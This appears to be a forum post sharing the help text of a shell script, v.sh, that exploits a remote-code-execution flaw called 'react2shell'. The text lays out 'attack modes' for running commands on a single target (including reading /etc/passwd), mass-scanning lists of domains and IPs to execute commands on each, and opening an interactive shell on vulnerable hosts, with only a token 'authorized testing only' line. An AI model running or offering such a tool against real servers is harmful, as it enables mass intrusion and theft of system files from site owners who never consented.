Sharing what i've been using for react2shell


  -d, --domain    Target domain/URL (default: http://localhost:3000)
                   If no protocol specified, defaults to https://
  -l, --list      File containing list of targets (one per line)
                   Supports: IP:port, domain, or full URLs
  -c, --command   Command to execute (default: id)
  -o, --output    Output file for results (default: scan_results.txt)
  --shell         Interactive shell mode (after scanning)
  -q, --quiet     Quiet mode (minimal output, faster scanning)
  -h, --help      Show this help message

ATTACK MODES:
  [1] Single Target:
      v.sh -d vulnapp.com -c id
      v.sh -d http://localhost:3000 -c "cat /etc/passwd"

  [2] Mass Scanning:
      v.sh -l targets.txt -c id
      v.sh -l targets.txt -c "whoami" -o results.txt

  [3] Interactive Shell (Pick Vulnerable Target):
      v.sh -l targets.txt --shell
      v.sh -d vulnapp.com --shell

TARGET LIST FORMAT:
  example.com
  192.168.1.100:3000
  subdomain.example.com:8080
  http://already-has-protocol.com

[!] Use responsibly. For authorized testing only.

